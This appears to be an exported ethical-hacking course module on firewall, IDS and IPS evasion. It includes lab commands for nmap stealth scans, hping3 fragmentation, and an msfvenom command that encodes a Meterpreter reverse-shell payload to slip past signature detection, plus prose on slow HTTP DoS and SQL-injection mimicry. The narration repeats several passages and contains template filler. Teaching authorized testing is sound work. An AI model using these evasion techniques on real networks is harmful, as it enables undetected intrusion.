screens.title: Firewalls, IDS, and IPS — what each one does
screens.narratorSegment: First, define the three defensive components you will test. A firewall is a system that filters traffic using rules based on IP addresses, ports, protocols, and sometimes application-layer content. Firewalls can be simple packet filters or more advanced stateful devices that track TCP connection state. An Intrusion Detection System monitors traffic and system activity for suspicious patterns and generates alerts; it does not automatically block by default. An IDS can be signature-based, matching known byte patterns, or anomaly-based, learning normal behavior and flagging deviations. An Intrusion Prevention System builds on IDS capabilities and can block or drop traffic when it detects a malicious pattern. The important teaching point is scope: firewalls often act at network and transport layers, signature IDS inspects payloads for known patterns, and anomaly IDS analyzes behavior over time. For example, a stateful firewall will notice an out-of-sequence TCP handshake, while a signature IDS will match a known exploit byte pattern. A key misconception is treating IDS and IPS as interchangeable; an IDS merely alerts and an IPS takes action. When you test defenses, you must know which device sits in-line and whether it reassembles fragments or inspects encrypted traffic; these behaviors determine which evasion methods may work. Reflect on which layer your target control inspects and design tests accordingly.

keyIdea.title: Scope Determines Evasion
keyIdea.text: Whether a defense inspects headers, state, or payloads determines which evasion techniques will succeed.

content.html:
Core Concept
Definitions
Clear definitions help you target tests to the right control.
Firewall
Filters traffic by IP, port, protocol; may be packet-filtering or stateful and sometimes inspects application layer.
Intrusion Detection System (IDS)
Monitors traffic for suspicious patterns and alerts; can be signature or anomaly based.
Intrusion Prevention System (IPS)
An IDS that can block traffic inline when it detects malicious activity.
Inspection behaviors
  • Packet filters check headers and ports; they may not track connection state.
  • Stateful devices track handshakes and sequence numbers, which affects scans that avoid full handshakes.
  • Signature systems match byte patterns; obfuscation can defeat them.
  • Anomaly systems analyze volume and behavior over time; slow-and-low attacks try to stay below thresholds.
Example
A stateful firewall may ignore a FIN or Null scan response pattern, while a signature IDS looks inside payload bytes and would only match a known exploit string.
Common Mistake
Assuming all devices reassemble fragments or decrypt TLS for inspection; they might not.

screens.title: Stealth Port Scanning: SYN, FIN, Xmas, and Null
screens.narratorSegment: Port scanning is a reconnaissance technique used to discover open services. The choice of scan type affects how stateful firewalls and IDS see the traffic. A TCP Connect scan performs full three-way handshakes and is the most detectable. A SYN scan, often called half-open, sends SYN and analyses SYN/ACK or RST replies without completing the handshake; it is quieter against stateful devices. FIN, Xmas, and Null scans manipulate TCP flags so that a closed port typically responds with RST while an open port gives no response on many systems — this behavior can evade basic stateful filters that only expect standard handshakes. In the lab you will run these nmap commands and compare results. Observe how a stateful firewall or IDS may mark a full Connect scan but ignore a FIN or Null craft. A common misconception is that all closed ports always behave the same; behavior depends on the target TCP/IP stack. Example commands you will use are shown in the code panel and should be run only in an authorized lab. After running them, capture packets and compare which packets reached the target and which were dropped or logged by intermediate devices. The takeaway: choose scanning techniques that match the defense you expect, and always validate results with captures.

keyIdea.title: Stealth vs. Loud Scans
keyIdea.text: Manipulating TCP flags can reduce visibility to stateful firewalls and some IDS, but behavior depends on target TCP/IP stacks and device configuration.

content.html:
Process Flow
Stealth Port Scanning
Run these scans in a controlled lab and observe device logs and packet captures to validate detection differences.
Commands (lab only)
nmap -sT <target_IP>
nmap -sS -Pn <target_IP>
nmap -sF -Pn <target_IP>
nmap -sX -Pn <target_IP>
nmap -sN -Pn <target_IP>
The -Pn option skips host discovery so scans focus on port behavior for comparison.
Example
Compare a full connect scan and a SYN scan against a VM with UFW enabled and record ports labeled as open, closed, or filtered.
Misconception
Assuming a stealth scan is invisible. It may still be logged by advanced IDS or by the host's TCP stack behavior.
What to capture
  • Packet flags and sequence of responses per port.
  • Firewall logs showing dropped or accepted packets.
  • IDS alerts for signature matches or unusual traffic patterns.
Check your understanding
If a FIN scan yields no reply on an open port, what does that tell you about the target stack and the stateful firewall behavior?
Key Takeaway

Choose the scan type to match the expected inspection method and always validate with packet captures and logs.

screens.title: IP Fragmentation for Evasion
screens.narratorSegment: IP fragmentation splits a single IP packet into multiple smaller fragments. Some firewalls or IDS may only inspect the first fragment or may fail to reassemble fragments for deep inspection. An attacker can place a malicious payload in subsequent fragments so the device misses it while the destination host reassembles and processes the full packet. In authorized lab tests you can use hping3 to craft fragmented traffic and observe whether an intermediate device blocks or logs the fragments. For example, the command shown in the code panel builds a single fragmented packet with randomized source IP to test egress and reassembly behavior. Always take care: fragmentation tests can destabilize devices or trigger unintended drops and even partial denial-of-service if misused. A common mistake is assuming all devices will reassemble fragments; modern inline devices differ. Your lab workflow should capture fragments with Wireshark, compare what the device logged, and then confirm the target host's reassembly. The takeaway is that fragmentation reveals reassembly and inspection differences; use it to demonstrate a gap but avoid running such tests without authorization and fallback plans.

keyIdea.title: Fragmentation Risk
keyIdea.text: If a device doesn't reassemble fragments for inspection, payloads placed in later fragments can bypass payload checks while the host reassembles them.

content.html:
Process Flow
IP Fragmentation
Use fragmentation to test whether intermediate devices reassemble before inspection.
Sample hping3 command (lab only)
sudo hping3 -c 1 -d 1000 -H 1337 -p 80 -f --rand-source <target_IP>
This sends a single fragmented packet with 1000 bytes of data and a randomized source IP to exercise reassembly behavior.
Example
Capture fragments on the wire and confirm whether an IDS logs only the first fragment or all fragments. Then confirm the target host reassembles and processes the payload.
Caution
Fragmentation can cause instability. Do not run tests on production networks without written authorization and rollback plans.
How to validate
  • Use Wireshark to view fragment offsets and reassembly order.
  • Check IDS/firewall logs for fragment handling and drops.
  • Confirm target host receives and reassembles fragments into the original payload.
Key Takeaway

Fragmentation highlights whether inspection happens before or after reassembly; use it to demonstrate gaps, not to exploit them.

screens.title: Source Port Manipulation and Egress Filtering
screens.narratorSegment: Source port manipulation changes the source port of outgoing packets so they appear to come from a trusted service, such as DNS or HTTP. Egress filters often allow traffic with source ports that match expected ephemeral ranges or special services; misconfigured rules can be exploited to make an outbound connection seem legitimate. For example, if an organization allows outbound traffic that appears to originate from port 53 or port 80, manipulating the source port can sometimes bypass naive egress filters. In practical testing, manipulate the source port in a lab and observe firewall logs and egress rules to confirm whether the change affects allowance. A common misconception is that source port spoofing always succeeds — modern networks often validate state and sequence numbers, and many devices block spoofed source addresses. Source-port manipulation is most effective when combined with additional mimicry, such as matching timing and payload patterns of the legitimate service. Always test in a lab and record how intermediate devices log or drop spoofed traffic. The takeaway is that source-port tactics can expose weak egress policies, but they are not a universal bypass and often require careful pairing with other techniques.

keyIdea.title: Egress Rules Matter
keyIdea.text: Manipulating source ports can reveal weak egress filtering, but success depends on upstream validation and proper session handling.

content.html:
Comparison
Source Port Manipulation
Compare expected behavior when traffic uses normal ephemeral source ports versus spoofed known-service ports.
Normal outbound flow
Client uses ephemeral source port; firewall sees an allowed outbound TCP or UDP session and tracks state.
Spoofed source port
Client forges source port to mimic DNS or HTTP; a naive egress policy may allow it, but state validation can still block it.
Common Mistake
Assuming spoofed ports bypass source address validation. Many networks verify session state and source IP consistency.
Lab example
Change the source port of an outbound TCP or UDP packet in a VM and observe whether the egress filter accepts or drops it. Check firewall logs for port and IP validation messages.
Example Observation
If the firewall accepts the spoofed source port but the target replies to the real source IP, the session will not be established — showing the technique’s limitations.
Check your understanding
Why would pairing source-port manipulation with traffic mimicry increase detection difficulty for anomaly systems?

screens.title: Evading Signature-Based IDS/IPS: Polymorphism and Obfuscation
screens.narratorSegment: Signature-based IDS/IPS detect known malicious byte patterns. To test these systems ethically, penetration testers use encoding and obfuscation to change the payload’s byte sequence while preserving functionality. Polymorphism and multiple encoding rounds alter instruction order or apply encoders repeatedly so signature rules fail to match. In the lab you will generate an encoded payload using msfvenom and compare its signature to an unencoded payload. The command in the code panel shows the syntax used to encode a Meterpreter reverse payload multiple times with the shikata_ga_nai encoder. After creating the payload, capture traffic and inspect whether the IDS flags the original pattern but not the encoded output. A common misconception is that encoding guarantees evasion; advanced signature systems may detect encoder stubs, anomalies in decoding sequences, or behaviors at runtime. Encryption, like wrapping traffic in HTTPS or a VPN tunnel, hides payload bytes entirely from signature engines but also requires different testing considerations. The takeaway: encoding is a realistic test method to validate signature coverage, but it must be combined with behavioral validation and clear documentation of any detection gaps you find.

keyIdea.text: Encoding and polymorphism change byte patterns to test signature coverage, but they do not guarantee invisibility to behavioral or advanced detection.

content.html:
Definition
Polymorphism & Obfuscation
Generate encoded payloads to test whether signature rules detect standard byte patterns.
Example msfvenom command (lab only)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f exe -e x86/shikata_ga_nai -i 5 -o payload.exe
This encodes the payload five times, altering its byte pattern significantly. Use only in an isolated lab.
Validation steps
  1. Generate the unencoded and encoded payloads.
  2. Send traffic in lab and capture both payload transfers with Wireshark.
  3. Compare IDS logs and packet contents for signature matches or misses.
Example Observation
The IDS may flag the unencoded binary but show no match for the encoded version; record the encoder artifacts and time stamps for your report.
Misconception
Encoding doesn’t remove behavior; runtime detection or anomaly rules may still catch the payload once it executes or communicates atypically.

screens.title: Evading Anomaly-Based Detection: Slow-and-Low and Mimicry
screens.narratorSegment: Anomaly-based IDS/IPS systems learn normal network behavior and flag deviations. To evaluate these systems, ethical testers use slow-and-low techniques and mimicry to avoid obvious anomalies. A slow-and-low approach sends small, infrequent, or incomplete requests over a long time so the traffic pattern stays under anomaly thresholds. For instance, a slow HTTP DoS sends incomplete requests at a trickle to exhaust resources without creating a sudden volume spike. Mimicry involves shaping malicious traffic to closely match legitimate application behavior, such as embedding S Q L injection payloads inside otherwise normal-looking POST requests that a user might send. In lab practice, you should build a baseline of normal traffic, then craft a slow or mimicked test and measure whether the anomaly detector flags it. A misconception is that anomaly systems are impossible to bypass — they can still be challenged by well-crafted mimicry, but tuning and contextual awareness often catch long-running suspicious flows. The practical takeaway: anomaly systems require careful, longer tests to evaluate, and you must document baseline behavior and time windows to prove an evasion worked or failed. Evading Anomaly-Based Detection: Slow-and-Low and Mimicry means anomaly detectors depend on baselines; slow, low-volume attacks or careful mimicry challenge their time-window and feature sensitivity.. In practical terms, behavioral tests that blend malicious actions into normal traffic. A concrete example makes the pattern visible, and a brief contrast helps prevent a common misconception. This matters because learners need the underlying reasoning before they can apply the idea confidently or notice where it breaks down. The main takeaway is that the concept should be understood as a meaningful pattern, not just a label on the screen.

content.html:
Process Flow
Slow-and-Low & Mimicry
Design tests that operate within baseline thresholds or mimic legitimate application traffic to evaluate anomaly sensitivity.
Slow-and-Low example
Send incomplete HTTP headers spaced over minutes to exhaust connection slots without producing a volume spike.
Mimicry example
Place a SQL payload inside a normal-looking web form POST that matches legitimate field names and timing.
Validation checklist
  • Establish a baseline of normal traffic patterns and time windows.
  • Run the slow test and record whether the anomaly detector flags it over the same windows.
  • Compare detector sensitivity and tune your reporting to show time-based evidence of evasion or detection.
Key Takeaway

Anomaly systems require contextual baseline data; proving an evasion needs careful, time-based evidence and comparison to normal behavior.

screens.title: Lab Walkthrough: Nmap and Hping3 against UFW
screens.narratorSegment: This lab walkthrough shows the practical steps to compare standard and stealth scans and test fragmentation against a VM running UFW. Start by preparing the target VM: install and enable UFW, allow SSH and HTTP, and run a simple web server. On the attacker VM run an initial nmap service scan and observe expected filtered results. Then perform a SYN scan and compare whether ports 22 and 80 are shown as open. Use packet capture on the target to see which packets arrive and whether UFW logs them as accepted or dropped. Next, run FIN and Null scans and note differences in RST behavior from the target stack. For fragmentation, run the hping3 command that sends a single fragmented packet and capture fragments with Wireshark; check whether intermediate devices logged fragment drops. A frequent mistake is running noisy scans too early; begin with stealthy options and escalate only with authorization. The lab's objective is not exploitation but evidence: produce packet captures and firewall logs that document how each technique interacted with the target defenses. End the lab by summarizing findings and recommended configuration or monitoring changes.

Target VM (commands)

screens.title: Common Mistakes and Pro Tips for Ethical Evasion Testing
screens.narratorSegment: When testing evasions, common mistakes can invalidate your results or cause harm. First, being too noisy with full TCP connect scans or large fragmented payloads can trigger automated blocks or cause service instability. Second, failing to collect packet captures and firewall logs makes your findings unverifiable. Third, assuming a single technique will work across different network stacks is risky; always test multiple approaches. As pro tips, begin with stealthy reconnaissance, escalate cautiously, and always validate a suspected bypass with captures from both the network and the target host. Use time-based evidence for anomaly tests and encode payloads incrementally to see which stage triggers a signature match. Document encoder parameters, timestamps, and device configuration snapshots so defenders can reproduce the issue. A misconception to flag is thinking that obfuscation alone proves a gap; defenders need evidence that payloads actually executed or traversed the device unchecked. The practical habit to build is a repeatable test plan that includes authorization, a controlled execution plan, packet captures, log exports, and remediation suggestions. This process protects systems and ensures your security findings are actionable. Definition
Mistakes to avoid
Noisy scans, missing captures, and single-technique reliance are common problems that reduce report value and increase risk.
Do: start quietly and escalate

fullNarratorScript:
In this chapter you will learn how firewalls, intrusion detection systems, and intrusion prevention systems function and why understanding their behavior is essential to ethical hacking. We will explore stealthy scanning techniques, packet fragmentation, source port manipulation, payload obfuscation, and slow-and-low tactics used to test defenses. You will see concrete command examples used in labs, how signature and anomaly detection differ, and why each evasion approach has trade-offs and risks. Practically, these techniques let you validate whether an organization’s controls actually detect real threats or only obvious noise. Importantly, we emphasize safety and legal boundaries: you must never attempt evasion without explicit authorization and a signed rules-of-engagement document. As you move through the lesson, think about how an encrypted tunnel or an application-layer firewall changes which techniques succeed and what evidence you would need to prove a gap to a defensive team. By the end you will be able to explain how each defense works, run controlled tests in a lab, and describe the ethical limitations of evasion testing.

This two-screen objectives panel explains the measurable skills you will practice and why they matter. First, you will understand how firewalls, IDS, and IPS operate, including what they inspect and how they take action. Knowing the difference between packet filters, stateful inspection, signature matching, and anomaly detection helps you choose appropriate tests and interpret results accurately. Second, you will learn stealth scanning techniques and how they interact with stateful devices. Practically, that means using SYN, FIN, Null, and Xmas scans to discover open services without triggering straightforward defenses. For each objective I will show concrete commands and expected outcomes in the lab so you can validate your results. These skills let you find blind spots defenders miss and craft reports with actionable evidence. Remember: every test must be authorized and controlled. The aim is to improve security, not to exploit it. As you proceed, reflect on which objective is most unfamiliar and focus your practice on that area.

On this second objectives panel we focus on practical measurement and safety. You will learn how to design lab experiments that reveal detection differences — for example, comparing a full TCP connect scan with a SYN scan and recording whether a stateful firewall logs a connection. Success is measured by reproducible captures and clear evidence: packet captures that show flags, fragment sequences, or encoded payloads. You will also learn to avoid common mistakes such as noisy scans and running tests against production systems. A key practical skill is documenting a rules-of-engagement and running tests against isolated VMs. The learning outcomes are both technical and procedural: produce clear captures that show why a control failed, propose configuration or tuning fixes, and report potential DoS risks when fragmentation or malformed traffic can destabilize the network. These habits protect you, the client, and the network while delivering usable security insights.

First, define the three defensive components you will test. A firewall is a system that filters traffic using rules based on IP addresses, ports, protocols, and sometimes application-layer content. Firewalls can be simple packet filters or more advanced stateful devices that track TCP connection state. An Intrusion Detection System monitors traffic and system activity for suspicious patterns and generates alerts; it does not automatically block by default. An IDS can be signature-based, matching known byte patterns, or anomaly-based, learning normal behavior and flagging deviations. An Intrusion Prevention System builds on IDS capabilities and can block or drop traffic when it detects a malicious pattern. The important teaching point is scope: firewalls often act at network and transport layers, signature IDS inspects payloads for known patterns, and anomaly IDS analyzes behavior over time. For example, a stateful firewall will notice an out-of-sequence TCP handshake, while a signature IDS will match a known exploit byte pattern. A key misconception is treating IDS and IPS as interchangeable; an IDS merely alerts and an IPS takes action. When you test defenses, you must know which device sits in-line and whether it reassembles fragments or inspects encrypted traffic; these behaviors determine which evasion methods may work. Reflect on which layer your target control inspects and design tests accordingly.

Port scanning is a reconnaissance technique used to discover open services. The choice of scan type affects how stateful firewalls and IDS see the traffic. A TCP Connect scan performs full three-way handshakes and is the most detectable. A SYN scan, often called half-open, sends SYN and analyses SYN/ACK or RST replies without completing the handshake; it is quieter against stateful devices. FIN, Xmas, and Null scans manipulate TCP flags so that a closed port typically responds with RST while an open port gives no response on many systems — this behavior can evade basic stateful filters that only expect standard handshakes. In the lab you will run these nmap commands and compare results. Observe how a stateful firewall or IDS may mark a full Connect scan but ignore a FIN or Null craft. A common misconception is that all closed ports always behave the same; behavior depends on the target TCP/IP stack. Example commands you will use are shown in the code panel and should be run only in an authorized lab. After running them, capture packets and compare which packets reached the target and which were dropped or logged by intermediate devices. The takeaway: choose scanning techniques that match the defense you expect, and always validate results with captures.

IP fragmentation splits a single IP packet into multiple smaller fragments. Some firewalls or IDS may only inspect the first fragment or may fail to reassemble fragments for deep inspection. An attacker can place a malicious payload in subsequent fragments so the device misses it while the destination host reassembles and processes the full packet. In authorized lab tests you can use hping3 to craft fragmented traffic and observe whether an intermediate device blocks or logs the fragments. For example, the command shown in the code panel builds a single fragmented packet with randomized source IP to test egress and reassembly behavior. Always take care: fragmentation tests can destabilize devices or trigger unintended drops and even partial denial-of-service if misused. A common mistake is assuming all devices will reassemble fragments; modern inline devices differ. Your lab workflow should capture fragments with Wireshark, compare what the device logged, and then confirm the target host's reassembly. The takeaway is that fragmentation reveals reassembly and inspection differences; use it to demonstrate a gap but avoid running such tests without authorization and fallback plans.

Source port manipulation changes the source port of outgoing packets so they appear to come from a trusted service, such as DNS or HTTP. Egress filters often allow traffic with source ports that match expected ephemeral ranges or special services; misconfigured rules can be exploited to make an outbound connection seem legitimate. For example, if an organization allows outbound traffic that appears to originate from port 53 or port 80, manipulating the source port can sometimes bypass naive egress filters. In practical testing, manipulate the source port in a lab and observe firewall logs and egress rules to confirm whether the change affects allowance. A common misconception is that source port spoofing always succeeds — modern networks often validate state and sequence numbers, and many devices block spoofed source addresses. Source-port manipulation is most effective when combined with additional mimicry, such as matching timing and payload patterns of the legitimate service. Always test in a lab and record how intermediate devices log or drop spoofed traffic. The takeaway is that source-port tactics can expose weak egress policies, but they are not a universal bypass and often require careful pairing with other techniques.

Signature-based IDS/IPS detect known malicious byte patterns. To test these systems ethically, penetration testers use encoding and obfuscation to change the payload’s byte sequence while preserving functionality. Polymorphism and multiple encoding rounds alter instruction order or apply encoders repeatedly so signature rules fail to match. In the lab you will generate an encoded payload using msfvenom and compare its signature to an unencoded payload. The command in the code panel shows the syntax used to encode a Meterpreter reverse payload multiple times with the shikata_ga_nai encoder. After creating the payload, capture traffic and inspect whether the IDS flags the original pattern but not the encoded output. A common misconception is that encoding guarantees evasion; advanced signature systems may detect encoder stubs, anomalies in decoding sequences, or behaviors at runtime. Encryption, like wrapping traffic in HTTPS or a VPN tunnel, hides payload bytes entirely from signature engines but also requires different testing considerations. The takeaway: encoding is a realistic test method to validate signature coverage, but it must be combined with behavioral validation and clear documentation of any detection gaps you find.

Anomaly-based IDS/IPS systems learn normal network behavior and flag deviations. To evaluate these systems, ethical testers use slow-and-low techniques and mimicry to avoid obvious anomalies. A slow-and-low approach sends small, infrequent, or incomplete requests over a long time so the traffic pattern stays under anomaly thresholds. For instance, a slow HTTP DoS sends incomplete requests at a trickle to exhaust resources without creating a sudden volume spike. Mimicry involves shaping malicious traffic to closely match legitimate application behavior, such as embedding S Q L injection payloads inside otherwise normal-looking POST requests that a user might send. In lab practice, you should build a baseline of normal traffic, then craft a slow or mimicked test and measure whether the anomaly detector flags it. A misconception is that anomaly systems are impossible to bypass — they can still be challenged by well-crafted mimicry, but tuning and contextual awareness often catch long-running suspicious flows. The practical takeaway: anomaly systems require careful, longer tests to evaluate, and you must document baseline behavior and time windows to prove an evasion worked or failed.
